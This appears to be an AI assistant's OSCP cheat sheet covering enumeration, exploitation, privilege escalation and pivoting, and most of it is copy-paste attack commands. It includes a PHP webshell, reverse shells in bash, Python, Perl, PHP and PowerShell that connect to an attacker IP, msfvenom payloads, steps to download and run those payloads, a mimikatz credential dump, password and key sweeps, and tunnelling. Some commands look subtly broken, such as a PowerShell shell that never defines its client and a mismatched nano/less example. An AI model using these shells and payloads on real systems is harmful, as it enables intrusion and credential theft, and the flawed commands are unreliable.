@@ -1,0 +1,492 @@
+Nice — I’ll give you a single, compact **comprehensive OSCP-ready notes & commands cheat-sheet** you can copy into your own lab notebook. It covers methodology, enumeration, exploitation, privilege escalation, post-exploitation, pivoting, reporting, and a large set of copy-pasteable commands and one-liners for Linux/Windows targets.
+
+> Quick note: I attempted to open the YouTube link you gave (the Siddicky VulnHub walkthrough), but the page fetch was throttled. If you want **machine-specific notes** for that exact video (step-by-step commands from the walkthrough), tell me and I’ll try again to pull the video and convert it into a precise transcript/command list. For now I’m giving a full, general OSCP-grade reference you can use immediately.
+
+# OSCP: methodology (the mindset)
+
+1. **Plan / Scope** — understand your allowed targets (lab/exam rules). Keep logs and screenshots of every action.
+2. **Enumerate thoroughly** — start from network discovery → open ports → service/version → app fingerprinting → auth/paths/configs. One missed service = lost box.
+3. **Exploit with care** — prefer manual exploitation or small, well-understood public exploits. Modify and understand every exploit you use.
+4. **Post-exploit** — collect flags, credentials, local info; attempt privilege escalation methodically.
+5. **Clean evidence & report** — keep clear steps, commands, screenshots, and timelines. Document everything.
+
+---
+
+# Quick workflow checklist
+
+1. `nmap` scan (fast + full)
+2. Service enumeration (HTTP, SMB, MSSQL, FTP, RPC, etc.)
+3. Web probing: `gobuster` / `dirb` / `ffuf` / Burp passive/active
+4. Auth bruteforce if allowed: `hydra`, `patator`, `medusa`
+5. Exploit or manual abuse (upload webshells, LFI→RCE, SQLi→RCE, misconfig)
+6. Post-exploit enumeration & creds extraction (files, configs, secrets)
+7. Privilege escalation (local checks + automated helpers for checklist)
+8. Persistence (only in lab/exam: ephemeral proof) / pivoting (SSH tunnels, socks)
+9. Document everything — commands, output, screenshots.
+
+---
+
+# Core tools (must know)
+
+* Network: `nmap`, `masscan`, `netcat`/`nc`, `socat`, `tcpdump`, `tshark`, `wireshark`
+* Web: `curl`, `wget`, `gobuster`, `ffuf`, `nikto`, `dirb`, Burp Suite (intruder, repeater), `sqlmap`
+* SMB/Windows: `smbclient`, `smbmap`, `enum4linux`, `rpcclient`, `crackmapexec` (cme)
+* Exploit: `msfconsole` (metasploit), `msfvenom`, manual scripts, `gcc`, `gdb`
+* Password cracking: `hashcat`, `john`
+* Windows post-exploitation: `winPEAS`, `PowerUp.ps1`, `Seatbelt`
+* Linux post-exploitation: `linpeas.sh`, `pspy`, GTFOBins knowledge
+* Pivoting: `sshuttle`, `proxychains`, `ssh -D`, `chisel`, `metasploit` route
+
+---
+
+# Nmap — scans & useful flags (copy/paste)
+
+Quick host discovery:
+
+```
+nmap -sn -PE -PA21,23,80,3389 10.10.0.0/24
+```
+
+Top ports + service/version + scripts + OS detection:
+
+```
+nmap -sC -sV -p- -O --min-rate 1000 -oA scans/target_full 10.10.10.5
+```
+
+Alternative split approach (fast then heavy):
+
+```
+nmap -sS -p- --min-rate 1000 -T4 -oA scans/target_allports 10.10.10.5
+nmap -sC -sV -p1-65535 -T4 -A -oA scans/target_version 10.10.10.5
+```
+
+Vuln scripts (example):
+
+```
+nmap --script vuln -p445,139 10.10.10.5 -oN nmap_vuln.txt
+nmap -p80 --script http-enum,http-vhosts,vuln 10.10.10.5
+```
+
+---
+
+# General enumeration: commands & one-liners
+
+Get OS/network info (if you already have a shell):
+
+```
+uname -a
+cat /etc/os-release
+id
+ip a
+ip route
+ss -tulpn
+```
+
+List installed packages / kernel:
+
+```
+dpkg -l | head
+rpm -qa | head
+cat /proc/version
+```
+
+Search for credentials, private keys, config files:
+
+```
+find / -type f -name "*.pem" 2>/dev/null
+grep -Ri "password" / 2>/dev/null
+grep -Ri "DB_PASSWORD" /var/www 2>/dev/null
+```
+
+Find SUID/SGID / world-writable:
+
+```
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+```
+
+Check sudo rights:
+
+```
+sudo -l
+```
+
+Check running services / processes:
+
+```
+ps aux --sort=-%mem | head
+systemctl list-units --type=service --state=running
+```
+
+Check crontabs:
+
+```
+crontab -l 2>/dev/null
+ls -la /etc/cron* && cat /etc/crontab
+```
+
+Check network connections and listening processes:
+
+```
+ss -tulpn
+netstat -tulpn
+lsof -i -P -n
+```
+
+Gather user data:
+
+```
+cat /etc/passwd
+awk -F: '$3>=1000{print $1}' /etc/passwd
+history
+last
+```
+
+---
+
+# Web app enumeration & exploitation
+
+Directory/file fuzzing:
+
+```
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster.txt
+ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/raft-small-directories.txt -t 50 -o ffuf.json
+```
+
+Check common files:
+
+```
+curl -I http://10.10.10.5/.env
+curl http://10.10.10.5/robots.txt
+```
+
+LFI/RFI check:
+
+```
+curl 'http://10.10.10.5/index.php?page=../../../../etc/passwd'
+```
+
+SQLi discovery (quick with sqlmap — confirm manual first):
+
+```
+sqlmap -u "http://10.10.10.5/page.php?id=1" --dbs --batch
+```
+
+Upload webshell via vulnerable upload (example PHP webshell):
+
+```
+<?php system($_GET['cmd']); ?>
+# Save as shell.php, upload to webroot, then call:
+http://10.10.10.5/uploads/shell.php?cmd=id
+```
+
+### Burp essentials
+
+* Intercept, send suspect requests to Repeater / Intruder.
+* Use Burp suite for parameter fuzzing, file upload tampering, session handling.
+
+---
+
+# SMB / Windows enumeration commands
+
+From Linux:
+
+```
+enum4linux -a 10.10.10.5
+smbclient -L \\\\10.10.10.5 -U ''
+smbclient \\\\10.10.10.5\\share -U 'guest'
+smbmap -H 10.10.10.5
+rpcclient -U "" 10.10.10.5
+```
+
+Use CrackMapExec:
+
+```
+crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt
+crackmapexec smb 10.10.10.5 -u Administrator -p 'P@ssw0rd!' --shares
+```
+
+If you find SMB share with writable upload, place a reverse shell or exe.
+
+---
+
+# Common reverse shells (copy/paste)
+
+Netcat (listener on attacker):
+
+```
+# Attacker:
+nc -lvnp 4444
+# Victim (bash):
+bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
+```
+
+Python:
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+```
+
+Perl:
+
+```
+perl -e 'use Socket;$i="10.10.14.2";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+PHP (for webshell):
+
+```
+php -r '$sock=fsockopen("10.10.14.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Windows PowerShell reverse shell:
+
+```
+# On attacker: nc -lvnp 4444
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+```
+
+---
+
+# msfvenom examples (payload creation)
+
+Linux reverse shell (ELF):
+
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf
+chmod +x shell.elf
+```
+
+Windows exe reverse:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
+```
+
+PHP payload:
+
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php
+```
+
+---
+
+# Privilege escalation — Linux checklist & commands
+
+1. `sudo -l` — check allowed cmds.
+2. `find / -perm -4000 -type f 2>/dev/null` — SUID files.
+3. `ps aux` & `systemctl` — misconfigured services, scripts.
+4. `cat /etc/passwd`, `cat /etc/shadow` (if readable).
+5. `ls -la /home`, search web app config files, `.my.cnf`, `.ssh` directories.
+6. Kernel exploits: `uname -a` and check known vuln (only use in lab).
+7. `getcap -r / 2>/dev/null` — capabilities.
+8. `grep -R "password" /etc 2>/dev/null` and `grep -R "AWS" / 2>/dev/null` for keys.
+9. `pspy` to watch cronjobs or scripts running as root.
+
+Useful automated helpers (use as checklist, not final answer):
+
+```
+# Download linpeas
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Common SUID escalations examples:
+
+```
+# If /usr/bin/vim is SUID (rare), spawn shell:
+vim -c ':!/bin/sh' -c ':q'
+# Or if nano has privileges:
+less /etc/shadow
+```
+
+---
+
+# Privilege escalation — Windows checklist & commands
+
+1. `whoami /priv` & `whoami /all`
+2. `systeminfo` / `ver` / `wmic qfe get HotFixID, InstalledOn` — check patches
+3. `net user` / `net localgroup administrators`
+4. `schtasks /query /fo LIST /v` — scheduled tasks
+5. `wmic service get name,displayname,pathname,startmode` — unquoted service path
+6. `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue` (PowerShell) — search for creds
+7. Use **PowerUp** and **winPEAS** to enumerate weaknesses.
+
+Typical privilege escalation methods:
+
+* Unquoted service paths
+* Weak service permissions
+* AlwaysInstallElevated (registry check)
+* Weak scheduled tasks
+* Insecure token impersonation or service misconfiguration
+* Plaintext creds in files / DBs / IIS configs
+* Exploitable drivers or vulnerable patches
+
+---
+
+# Post-exploitation: data gathering & lateral movement
+
+Collect host evidence and important files:
+
+```
+# Linux
+tar czf /tmp/box_data_$(hostname).tgz /etc /home /var/www /root 2>/dev/null
+# Windows (Powershell)
+Get-ChildItem C:\inetpub -Recurse | Out-File C:\temp\files.txt
+```
+
+Dump hashes / creds:
+
+```
+# Linux
+locate *.sql 2>/dev/null | xargs grep -i password 2>/dev/null
+# Windows (if you have SYSTEM)
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+Pivoting / tunneling:
+
+```
+# Create SOCKS proxy with SSH (if you have ssh to an internal host)
+ssh -D 9050 -C -N user@internal
+# Using chisel (client/server)
+# On attacker:
+./chisel server -p 8888 --reverse
+# On pivot host (victim with outbound connectivity):
+./chisel client attacker:8888 R:5555:127.0.0.1:3389
+# Now on attacker: nc 127.0.0.1 5555 connects to internal RDP
+```
+
+ProxyChains for routing traffic:
+
+```
+proxychains4 nmap -sT -Pn -p 80 127.0.0.1
+```
+
+---
+
+# Useful one-liners & file transfer methods
+
+Python HTTP server:
+
+```
+# on attacker machine in folder with payloads
+python3 -m http.server 8000
+# on victim (download wget/curl):
+wget http://10.10.14.2:8000/shell.elf
+curl -O http://10.10.14.2:8000/shell.elf
+```
+
+Base64 transfer to avoid filters:
+
+```
+# On attacker:
+base64 shell.elf > shell.b64
+# On victim:
+cat shell.b64 | base64 -d > shell.elf; chmod +x shell.elf; ./shell.elf
+```
+
+PowerShell file transfer:
+
+```
+# Attacker: serve file with Python
+# Victim:
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2/shell.exe','C:\\Windows\\Temp\\shell.exe')"
+```
+
+---
+
+# Buffer overflow basics (OSCP practical)
+
+1. Identify vuln via fuzzing (e.g., `pattern_create` / `pattern_offset`)
+2. Determine offset, overwrite return address, control EIP/RIP.
+3. Avoid badchars; use NOP sleds; test payload sizes.
+4. Compile exploit with correct architecture.
+   Tools:
+
+* `gdb` / `gdb-peda` / `pwndbg`
+* `pattern_create.rb` / `pattern_offset.rb` (metasploit tools)
+* `objdump -d` / `readelf -s` / `file`
+  Common commands:
+
+```
+# Create cyclic pattern (metasploit)
+python3 -c 'from pwn import *; print(cyclic(500))'
+# After crash, find offset 
+# Using pattern_offset
+python3 - <<'PY'
+from pwn import *
+print(cyclic_find(0x6161616b)) # put crashed EIP value
+PY
+```
+
+---
+
+# Reporting checklist (OSCP exam-style)
+
+* Executive summary (short): target, method, result (root/administrator)
+* Environment & scope: lab/exam info, network addresses, counting of machines.
+* Step-by-step exploitation for each machine: commands used, outputs, and screenshots. Use sequential numbered steps.
+* Evidence: screenshots of user.txt and root.txt (or equivalent) and key commands.
+* Mitigations & recommendations.
+* Appendix: raw command log, exploit scripts (annotated), wordlist sources.
+
+---
+
+# Exam tips & best practices
+
+* Time management: enumerate fast, prioritize low-hanging fruit.
+* Keep a live running `notes.md` with command & output snippets; copy screenshots into report as you go.
+* If stuck on one path > 45 minutes, switch to another machine or approach. (lab practice)
+* Practice buffer overflow end-to-end until comfortable.
+* Know how to escalate on both Linux and Windows: SUID, cron, sudo; unquoted paths, weak perms, scheduled tasks.
+* Use automation (linpeas/winPEAS) for triage but verify manually for write-ups.
+
+---
+
+# Ready-to-paste cheat sheet (condensed)
+
+```
+# Quick nmap
+nmap -sC -sV -p- -T4 -oA nmap/full 10.10.10.5
+
+# SMB
+enum4linux -a 10.10.10.5
+smbclient -L \\\\10.10.10.5 -U ''
+smbmap -H 10.10.10.5
+
+# Web fuzz
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50 -o gobuster.txt
+
+# Reverse shell (listener)
+nc -lvnp 4444
+# bash on victim:
+bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
+
+# Simple file transfer
+python3 -m http.server 8000  # attacker
+wget http://10.10.14.2:8000/shell.elf
+
+# Check for SUID files
+find / -perm -4000 -type f 2>/dev/null
+
+# Check sudo
+sudo -l
+
+# Gather system info (Windows)
+systeminfo
+whoami /priv
+net user
+schtasks /query /fo LIST /v
+```
+
+---
+
+If you want, I can next:
+
+* a) **Turn this into a printable PDF** (well-formatted lab notes + commands) and provide a download link.
+* b) **Fetch that specific YouTube video** you linked and produce *exact, step-by-step* commands and screenshots/transcript from it (I attempted once but page fetch was throttled — I can retry).
+* c) **Create a one-page A4 “cheat sheet”** with the most critical commands only.
+
+Which one would you like me to do now? (If you want the YouTube-specific walkthrough, say “video notes” and I’ll re-pull the link and convert it into exact commands.)
